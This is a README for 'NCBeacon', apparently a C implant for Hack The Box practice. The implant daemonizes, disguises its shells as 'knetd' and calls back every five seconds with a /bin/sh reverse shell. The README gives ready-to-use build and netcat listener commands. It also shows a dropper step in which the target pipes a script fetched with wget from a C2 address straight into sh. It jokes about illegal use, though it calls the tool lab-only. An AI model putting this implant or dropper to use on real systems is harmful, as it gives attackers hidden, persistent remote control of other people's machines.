NCBeacon
--------
A small beaconing implant meant to be caught with netcat.  This was written
after watching someone hack [hackthebox](hackthebox.eu) boxes, lose his shell a
few times, and have to re-exploit to get it back.  All it does is call back
every few seconds.

Features
- Calls back with `/bin/sh` hooked up to the TCP connection every 5 seconds
- [Daemonizes](https://man.openbsd.org/daemon) itself
- Dissociates the shells it spawns from the parent process
- Spawned shells have a configurable name (i.e. `argv[0]`)

For legal use only, though you'd probably be doing law enforcement a favor if
you used this for illegal purposes.

Quickstart
----------
1. Build it (replacing the `CALLBACK_ADDRESS` with your address
```sh
cc -O2 -DCBADDR=CALLBACK_ADDRESS -o ncbeacon ncbeacon.c
```
2. Put it on target
3. Set up netcat to catch it
```sh
rlwrap nc -nvlp 4444
```
4. Start it, on target
```
./ncbeacon
```

Configuration
-------------
There are a few compile-time settings controlled by macros (i.e. -DNAME=VALUE)

Macro    | Required | Default | Description
---------|----------|---------|------------
`CBADDR` | *Yes*    | _None_  | Callback Address
`CBPORT` | _No_     | 4444    | Callback Port
`CBWAIT` | _No_     | 5       | Time between callbacks, in seconds
`SHNAME` | _No_     | `knetd` | Name (`argv[0]`) of spawned shells
`DEBUG`  | _No_     | _Unset_ | If set, logs errors and prevents backgrounding

Excessive Process Spawning
--------------------------
One of the downsides of spawnining a new process to call back ever few seconds
is that if something accepts the connection and never closes it, the process
doesn't die.  I'm looking at you OpenBSD
[`nc(1)`](https://man.openbsd.org/nc.1).  This can be solved by using a tool
to catch the connection which closes the listening socket after accepting a
connection, such as ncat.

The included program [nccatch](./nccatch.c) will also happily catch a
connection from ncbeacon.  Build it with
```sh
cc -O2 -o nccatch nccatch.c
```

Give it either a port or an address and port, like `./nccatch 4444` or
`./nccatch 127.0.0.1 4444`.

OpSec Considerations
--------------------
This is bad.

- No encryption
- No authentication
- Very frequent connection attempts
- Very regular connection attempts
- Connects up a shell to stdio (have a look at `/proc/$$/fd`)

In other words, this is pretty much only suitable for HTB and similar safe
environments.  Please don't use this for actual engagements unless you have a
very good reason to.

Dropper
-------
A script to generate a shell script named [bin2dropper.sh](./bin2dropper.sh)
which drops and runs a payload is included in this repository.  It takes a
payload and writes to stdout a script which will drop the payload, run it, and
remove it.  Prerequisites on target are openssl and gunzip.

Example:
```sh
./bin2sh -d sneaky ./ncbeacon | nc -Nnvl 8080 # On C2 infrastructure
cd /tmp; wget -qO- C2_ADDR 8080 | sh          # On target
```
This will use wget to grab a script which drops `./ncbeacon` to `/tmp/sneaky`
and runs it as `sneaky`.

You can now mark off "in-memory dropper execution" on your buzzword bingo card.
